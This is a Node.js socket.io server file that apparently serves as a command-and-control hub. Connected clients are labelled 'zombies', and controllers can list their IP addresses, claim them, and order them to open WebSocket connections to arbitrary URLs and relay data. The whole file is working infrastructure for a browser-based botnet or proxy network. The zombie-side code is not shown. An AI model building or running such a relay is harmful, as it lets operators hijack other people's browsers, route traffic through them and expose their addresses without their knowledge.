const app = require("express")();
const server = require("http").createServer(app);
const io = require("socket.io")(server, {
    cors: {
        origin: "*"
    }
});
global.lastId = 0;

const Client = require("./Client.js");

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/client/index.html");
});

var sockets = [];
var clients = [];

const getController = clientId => clients.find(client => client.id === clientId);
const getTarget = targetId => clients.find(client => client.id === targetId);

const zombieNamespace = io.of("/");
const controllerNamespace = io.of("/controller");

zombieNamespace.on("connection", socket => {
    sockets.push(socket);
    const client = new Client(socket);
    clients.push(client);

    socket.on("status", status => {
        const controllers = clients.filter(sock => sock.id === client.controller);
        if (controllers.length > 0) controllers[0].ws.emit("status", client.id, status);
    });

    socket.on("message", message => {
        const controller = getController(client.controller);
        if (controller) controller.ws.emit("message", client.id, message);
    });

    socket.on("disconnect", () => {
        sockets = sockets.filter(sock => sock.id !== socket.id);
        clients = clients.filter(cli => cli.sid !== socket.id);
    });
});

controllerNamespace.on("connection", socket => {
    const client = new Client(socket);
    client.markedController = true;
    clients.push(client);

    socket.emit("id", client.id);

    socket.on("control", id => {
        const target = getTarget(id);
        if (!target || target.markedController || target.controlled) return;
        target.controller = client.id;
        target.controlled = true;
    });

    socket.on("uncontrol", id => {
        const target = getTarget(id);
        if (!target || target.markedController || !target.controlled) return;
        target.controller = 0;
        target.controlled = false;
        target.ws.emit("close");
    });

    socket.on("send", (targetId, data) => {
        const target = getTarget(targetId);
        if (!target) return;
        target.ws.emit("send", data);
    });

    socket.on("close", targetId => {
        const target = getTarget(targetId);
        if (!target) return;
        target.connected = false;
        target.ws.emit("close");
    });

    socket.on("con", (targetId, url, binaryType) => {
        const target = getTarget(targetId);
        if (!target) return;
        target.connected = true;
        target.ws.emit("con", url, binaryType);
    });

    socket.on("disconnect", () => {
        const controlled = clients.filter(sock => sock.controller === client.id);
        controlled.forEach(zombie => {
            zombie.controller = 0;
            zombie.controlled = false;
            zombie.ws.emit("close");
        });

        sockets.splice(sockets.indexOf(socket), 1);
        clients.splice(clients.indexOf(client), 1);
    });

    let previousList = [];
    setInterval(() => {
        let filteredClients = clients.filter(cli =>
            cli.sid !== socket.id &&
            (cli.controller === 0 || cli.controller === client.id) &&
            !cli.markedController
        );

        let reducedClients = filteredClients.map(cli => {
            return {
                id: cli.id,
                ip: cli.ip,
                sid: cli.sid,
                controller: cli.controller,
                connected: cli.connected
            }
        });

        // Check if the current list is different from the previous list
        if (JSON.stringify(reducedClients) !== JSON.stringify(previousList)) {
            socket.emit("list", reducedClients);
            previousList = reducedClients;
        }
    }, 1000);
});

server.listen(8080, () => {
    console.log("Server listening on localhost:8080");
});